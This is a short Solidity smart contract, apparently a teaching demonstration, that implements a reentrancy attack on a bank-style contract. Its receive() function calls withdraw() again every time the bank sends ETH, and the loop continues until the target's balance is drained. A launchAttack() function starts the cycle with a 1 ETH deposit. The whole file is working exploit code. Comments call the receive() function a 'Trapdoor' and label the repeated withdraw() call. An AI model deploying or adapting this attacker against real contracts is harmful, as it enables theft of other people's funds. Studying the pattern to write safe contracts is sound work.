pragma solidity ^0.8.0;

interface IVulnerableBank {
    function withdraw() external;
    function deposit() external payable;
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    // This is the "Trapdoor"
    // When the bank sends ETH, this function triggers automatically
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // <--- This is the "Re-entry" loop!
        }
    }

    function launchAttack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH to start attack");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
